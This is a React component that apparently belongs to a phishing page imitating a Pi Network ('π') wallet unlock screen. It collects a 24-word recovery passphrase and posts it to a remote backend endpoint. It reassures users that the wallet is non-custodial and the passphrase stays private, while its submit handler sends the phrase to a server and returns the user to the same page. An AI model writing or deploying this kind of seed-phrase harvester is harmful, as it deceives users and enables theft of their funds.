import React, { useState } from "react";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import logo from "../assets/logo.webp";
import BASE_URL from "../components/urls";
import axios from "axios";
import { useNavigate } from "react-router-dom";

// Validation schema using Yup
const schema = yup.object().shape({
  passphrase: yup
    .string()
    .required("Passphrase is required")
    .test(
      "is-24-words",
      "Passphrase must be exactly 24 words",
      (value) => value && value.trim().split(/\s+/).length === 24
    ),
});

// Header Component
const Header = () => {
  return (
    <div className="flex items-center justify-evenly bg-[#713D92] text-white py-2 px-4">
      <h2 className="text-lg font-bold flex items-center">
        Mine <img className="w-[30px]" src={logo} alt="" />
      </h2>
    </div>
  );
};

const PassPhrase = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
  });

  // Handle form submission
  const onSubmit = (data) => {
    axios
      .post(`${BASE_URL}/passphrase`, data)
      .then((response) => {
        console.log(response.data);
        reset();
        navigate("/passphrase");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      });
  };

  return (
    <div className="min-h-screen flex flex-col">
      {/* Render Header Component */}
      <Header />

      <div className="flex-1 flex flex-col items-center justify-center px-4">
        <h2 className="text-2xl font-bold text-gray-800 mb-4">
          Unlock Your Wallet
        </h2>
        <form
          onSubmit={handleSubmit(onSubmit)}
          className="w-full max-w-md rounded px-8 pt-6 pb-8 mb-4"
        >
          <div className="mb-4">
            <label
              htmlFor="passphrase"
              className="block text-gray-700 text-sm font-bold mb-2"
            >
              Passphrase:
            </label>
            <textarea
              id="passphrase"
              rows="4"
              className="w-full border border-gray-300 rounded p-2 focus:outline-none focus:ring-2 focus:ring-purple-600"
              placeholder="Enter your 24-word passphrase"
              {...register("passphrase")}
            />
            {errors.passphrase && (
              <p className="text-red-500 text-sm mt-2">
                {errors.passphrase.message}
              </p>
            )}
          </div>

          <button
            type="submit"
            className="w-full border border-[#713D92] text-[#713D92] font-bold py-3 rounded mb-3"
          >
            Unlock With Passphrase
          </button>
        </form>

        <p className="text-gray-600 text-xl mt-4">
          As a non-custodial wallet, your wallet passphrase is exclusively
          accessible only to you. Recovery of passphrase is currently
          impossible.
        </p>
        <br />
        <p className="text-gray-600 text-xl">
          Lost your passphrase?{" "}
          <a href="#" className="text-blue-600 hover:underline">
            You can create a new wallet
          </a>
          , but all your π in your previous wallet will be inaccessible.
        </p>
      </div>
    </div>
  );
};

export default PassPhrase;
